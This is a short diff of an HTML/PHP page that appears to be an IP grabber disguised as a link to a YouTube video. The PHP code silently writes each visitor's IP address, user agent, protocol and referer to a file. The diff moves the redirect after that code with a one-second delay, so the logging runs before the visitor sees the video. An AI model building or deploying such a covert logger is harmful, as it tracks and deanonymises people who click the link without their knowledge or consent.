@@ -1,6 +1,5 @@
 <html>
 <head>
-<meta http-equiv="refresh" content="0; URL=https://youtu.be/iik25wqIuFo" />
 <?php
 $protocol = $_SERVER['SERVER_PROTOCOL'];
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -16,5 +15,6 @@ fwrite($fh, 'User Agent: '."".$agent ."\n");
 fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
 fclose($fh);
 ?>
+<meta http-equiv="refresh" content="1; URL=https://youtu.be/iik25wqIuFo" />
 </head>
 </html>
